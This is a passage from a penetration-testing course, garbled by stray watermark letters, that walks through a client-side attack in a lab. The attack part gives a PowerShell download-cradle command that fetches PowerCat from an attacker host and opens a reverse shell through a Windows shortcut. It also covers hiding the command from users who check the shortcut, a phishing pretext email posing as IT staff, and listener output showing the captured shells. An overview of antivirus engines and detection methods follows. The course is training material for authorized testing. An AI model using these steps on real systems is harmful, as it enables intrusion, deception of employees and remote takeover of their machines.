Made in Morocco
Penetration Testing with Kali Linux
Let’s create the shortcut on the desktop for the offsec user. For this, we’ll right-click on the
desktop and click on New then on Shortcut. In the Create Shortcut window, we can enter a path to
a program along with arguments, which will be pointed to by the shortcut. We’ll point the shortcut
to PowerShell and use another download cradle to load PowerCat from our Kali machine and
start a reverse shell.
We’ll use the command we leveraged previously:
powershell.exe -c "IEX(New-Object
System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');
powercat -c 192.168.119.3 -p 4444 -e powershell"
Listing 228 - PowerShell Download Cradle and PowerCat Reverse Shell Execution
We’ll enter this command into the input field and click Next.
y
k
s
o
n
i
z
D
Figure 193: Creating a Shortcut on CLIENT137
If we expect that our victims are tech-savvy enough to actually check where the
shortcut files are pointing, we can use a handy trick. Since our provided
command looks very suspicious, we could just put a delimiter and benign
command behind it to push the malicious command out of the visible area in the
file’s property menu. If a user were to check the shortcut, they would only see the
benign command.
In the next window, let’s enter automatic_configuration as the name for the shortcut file and click
Finish to create the file.
On our Kali machine, let’s start a Python3 web server on port 8000 where powercat.ps1 is located
and start a Netcat listener on port 4444.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 346
Made in Morocco
Penetration Testing with Kali Linux
Instead of using a Python3 web server to serve Powercat, we could also host it
on the WebDAV share. However, as our WebDAV share is writable, AV and other
security solutions could remove or quarantine our payload. If we configure the
WebDAV share as read-only, we’d lose a great method of transferring files from
target systems. Throughout this course, we’ll use a Python3 web server to serve
our payload for attacks utilizing Windows Library files.
To confirm that the download cradle and the PowerCat reverse shell works, let’s double-click the
shortcut file on the desktop. After confirming that we want to run the application in the appearing
window, the Netcat listener should receive a reverse shell.
kali@kali:~$ nc -nvlp 4444
y
listening on [any] 4444 ...
connect to [192.168.119.2] from (UNKNOWN) [192.168.50.194] 49768
Windows PowerShell k
Copyright (C) Microsoft Corporation. All rights reserved.
Install the latest PowerShell for new features ands improvements!
https://aka.ms/PSWindows
o
PS C:\Windows\System32\WindowsPowerShell\v1.0>
Listing 229 - Successful reverse shell connection via our Shortcut file
n
To conclude this section, let’s obtain a reverse shell from the HR137 machine at 192.168.50.195.
For this example, we’ll provide the Windows library file we created to a simulated victim with a
pretext. Our goal is to convince thie victim to double-click the shortcut after embedding the
WebDAV share via the prepared Wzindows library file.
The pretext is an important aspect of this client-side attack. In this case we could tell the target
D
that we are a new member of the IT team and we need to configure all client systems for the new
management platform. We’ll also tell them that we’ve included a user-friendly configuration
program. An example email for use in a real assessment is shown below.
Hello! My name is Dwight, and I'm a new member of the IT Team.
This week I am completing some configurations we rolled out last week.
To make this easier, I've attached a file that will automatically
perform each step. Could you download the attachment, open the
directory, and double-click "automatic_configuration"? Once you
confirm the configuration in the window that appears, you're all done!
If you have any questions, or run into any problems, please let me
know!
Listing 230 - Example email content
Now, let’s copy automatic_configuration.lnk and config.Library-ms to our WebDAV directory on
our Kali machine. For convenience, we can use the config library file to copy the files into the
directory. In a normal assessment we would most likely send the library file via email but for this
example, we’ll use the \\192.168.50.195\share SMB share to simulate the delivery step.
Next, we’ll start the Python3 web server on port 8000 to serve powercat.ps1, WsgiDAV for our
WebDAV share /home/kali/webdav, and a Netcat listener on port 4444.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 347
Made in Morocco
Penetration Testing with Kali Linux
To upload the library file to the SMB share, we’ll use smbclient540 with the -c parameter to specify
the put config.Library-ms command. Before we execute smbclient, we need to change our current
directory to the library file’s directory. We’ll also delete the previously-created test.txt file from the
WebDAV share.
kali@kali:~$ cd webdav
kali@kali:~/webdav$ cd webdav
kali@kali:~/webdav$ rm test.txt
kali@kali:~/webdav$ smbclient //192.168.50.195/share -c 'put config.Library-ms'
Enter WORKGROUP\kali's password:
putting file config.Library-ms as \config.Library-ms (1.8 kb/s) (average 1.8 kb/s)
Listing 231 - Uploading our Library file to the SMB share on the HR137 machine
y
After we put the library file on the target’s machine via smbclient, a simulated user on the system
opens it and starts the reverse shell by executing the shortcut file.
k
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ... s
connect to [192.168.119.2] from (UNKNOWN) [192.168.50.195] 56839
Windows PowerShell
o
Copyright (C) Microsoft Corporation. All rights reserved.
Install the latest PowerShell for new features and improvements!
n
https://aka.ms/PSWindows
PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
i
whoami
z
hr137\hsmith
Listing 232 - Incoming reverse shell from HR137
D
Listing 232 shows that we successfully received a reverse shell with our Library and shortcut
files.
Excellent.
We could also have combined this technique with our previous Office macro attack, or any other
type of client-side attacks.
In this section, we learned about Windows Library files and how to weaponize them as an
effective first stage to deliver an executable file in client-side attacks. As second stage, we used a
shortcut file to download PowerCat and start a reverse shell. Windows Library files are a great
way to deliver our second stage payloads without exposing them to security technologies such as
spam filters.
540 (Samba, 2022), https://www.samba.org/samba/docs/current/man-html/smbclient.1.html
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 348
Made in Morocco
Penetration Testing with Kali Linux
11.4 Wrapping Up
Client-side attack vectors are often an effective way of getting an initial foothold in a non-routable
internal network. They are especially insidious as they exploit weaknesses or leverage
functionality of existing client software.
In this Module, we learned how to get information about our targets to prepare client-side attacks.
We then leveraged Microsoft Office macros, Windows library files, and shortcut files to obtain
code execution and receive reverse shells.
y
k
s
o
n
i
z
D
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 349
Made in Morocco
Penetration Testing with Kali Linux
12 Antivirus Evasion
In this Module, we will cover the following Learning Units:
• Antivirus Software Key Components and Operations
• Bypassing Antivirus Detections
• Antivirus Evasion in Practice
In an attempt to compromise a target machine, attackers often disable or otherwise bypass
antivirus software installed on these systems. As penetration testers, we must understand and be
able to recreate these techniques in order to demonstrate this potential threat to our client.
In this Module, we will discuss the purpose of antivirus software,y discover how it works, and
outline how it is deployed in most companies. We will examine various methods used to detect
malicious software and explore some of the available tools and techniques that will allow us to
k
bypass AV software on target machines.
s
12.1 Antivirus Software Key Components and Operations
This Learning Unit covers the following Learning Oobjectives:
• Recognize known vs unknown threats
n
• Understand AV key components
• Understand AV detection engines
i
z
Antivirus (AV),541 is a type of application designed to prevent, detect, and remove malicious
software. It was originally designed to simply remove computer viruses. However, with the
development of new typesD of malware, like bots and ransomware,542 antivirus software now
typically includes additional protections such as IDS/IPS,543 firewall, website scanners, and more.
12.1.1 Known vs Unknown Threats
In its original design, an antivirus software bases its operation and decisions on signatures. The
goal of a signature is to uniquely identify a specific piece of malware. Signatures can vary in
terms of type and characteristics that can span from a very generic file hash summary to a more
specific binary sequence match. As we’ll discover in the following section, an AV comprises
different engines responsible for detecting and analyzing specific components of the running
system.
A signature language is often defined for each AV engine and thus, a signature can represent
different aspects of a piece of malware, depending on the AV engine. For example, two signatures
can be developed to contrast the exact same type of malware: one to target the malware file on
disk and another to detect its network communication. The semantics of the two signatures can
541 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Antivirus_software
542 (Crowdstrike, 2022), https://www.crowdstrike.com/cybersecurity-101/malware/types-of-malware/
543 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Intrusion_detection_system
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 350
Made in Morocco
Penetration Testing with Kali Linux
vary drastically as they are intended for two different AV engines. In 2014, a signature language
named YARA544 was open-sourced to allow researchers to query the VirusTotal545 platform or
even integrate their own malware signatures into AV products. VirusTotal is a malware search
engine that allows users to search known malware or submit new samples and scan them
against a number of AV products.
As signatures are written based on known threats, AV products could initially only detect and
react based on malware that has already been vetted and documented. However, modern AV
solutions, including Windows Defender,546 are shipped with a Machine Learning (ML)547 engine that
is queried whenever an unknown file is discovered on a system. These ML engines can detect
unknown threats. Since ML engines operate on the cloud, they require an active connection to the
internet, which is often not an option on internal enterprise servers. Moreover, the many engines
that constitute an AV should not borrow too many computing resources from the rest of the
system as it could impact the system’s usability.
y
To overcome these AV limitations, Endpoint Detection and Response (EDR)548 solutions have
evolved during recent years. EDR software is responsible for generating security-event telemetry
k
and forwarding it to a Security Information and Event Management (SIEM)549 system, which
collects data from every company host. These events are then rendered by the SIEM so that the
s
security analyst team can gain a full overview of any past or ongoing attack affecting the
organization.
o
Even though some EDR solutions include AV components, AVs and EDRs are not mutually
exclusive as they complement each other with enhanced visibility and detection. Ultimately, their
n
deployment should be evaluated based on an organization’s internal network design and current
security posture.
i
12.1.2 AV Engines and Components
z
At its core, a modern AV is fueled by signature updates fetched from the vendor’s signature
database that resides on Dthe internet. Those signature definitions are stored in the local AV
signature database, which in turn feeds the more specific engines.
A modern antivirus is typically designed around the following components:
• File Engine
• Memory Engine
• Network Engine
• Disassembler
• Emulator/Sandbox
544 (Wikipedia, 2022), https://en.wikipedia.org/wiki/YARA
545 (VirusTotal, 2019), https://www.virustotal.com/#/home/upload
546 (Microsoft, 2022), https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/microsoft-defender-antivirus-
windows?view=o365-worldwide
547 (Microsoft, 2022), https://www.microsoft.com/security/blog/2017/08/03/windows-defender-atp-machine-learning-detecting-new-
and-unusual-breach-activity/
548 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Endpoint_detection_and_response
549 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Security_information_and_event_management
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 351
Made in Morocco
Penetration Testing with Kali Linux
• Browser Plugin
• Machine Learning Engine
Each of the engines above work simultaneously with the signature database to rank specific
events as either benign, malicious, or unknown.
The file engine is responsible for both scheduled and real-time file scans. When the engine
performs a scheduled scan, it simply parses the entire file system and sends each file’s metadata
or data to the signature engine. On the contrary, real-time scans involve detecting and possibly
reacting to any new file action, such as downloading new malware from a website. In order to
detect such operations, the real-time scanners need to identify events at the kernel level via a
specially crafted mini-filter driver.550 This is the reason why a modern AV needs to operate both in
kernel and user land, in order to validate the entire operating system scope.
The memory engine inspects each process’s memory space at ruyntime for well-known binary
signatures or suspicious API calls that might result in memory injection attacks, as we’ll find
shortly. k
As the name suggests, the network engine inspects the incoming and outgoing network traffic on
s
the local network interface. Once a signature is matched, a network engine might attempt to
block the malware from communicating with its Command and Control (C2)551 server.
o
To further hinder detection, malware often employs encryption and decryption through custom
routines in order to conceal its true nature. AVs counterattack this strategy by disassembling the
malware packers or ciphers and loading then malware into a sandbox, or emulator.
The disassembler engine is responsible for translating machine code into assembly language,
i
reconstructing the original program code section, and identifying any encoding/decoding routine.
z
A sandbox is a special isolated environment in the AV software where malware can be safely
loaded and executed without causing potential havoc to the system. Once the malware is
unpacked/decoded and runDning in the emulator, it can be thoroughly analyzed against any known
signature.
As browsers are protected by the sandbox, modern AVs often employ browser plugins to get
better visibility and detect malicious content that might be executed inside the browser.
Additionally, the machine learning component is becoming a vital part of current AVs as it enables
detection of unknown threats by relying on cloud-enhanced computing resources and algorithms.
12.1.3 Detection Methods
As mentioned earlier, antivirus signature syntax and scope may differ based on the engine they
have been built for, but they still serve the same purpose of uniquely identifying a specific threat
or malware.
In this section, we are going to explore the following AV detection methodologies and explain how
they work together.
• Signature-based Detection
550 (Microsoft, 2022), https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/filter-manager-concepts
551 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Botnet#Command_and_control
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 352
Made in Morocco
Penetration Testing with Kali Linux
• Heuristic-based Detection
• Behavioral Detection
• Machine Learning Detection
Signature-based antivirus detection is mostly considered a restricted list technology. In other
words, the filesystem is scanned for known malware signatures and if any are detected, the
offending files are quarantined.
A signature can be just as simple as the hash of the file itself or a set of multiple patterns, such as
specific binary values and strings that should belong only to that specific malware.
Relying on just the file hash as the only detection mechanism is a weak strategy because
changing a single bit from the file would result in a completely different hash.
y
As an example, we created a text file on our local Kali machine that contains the string “offsec”.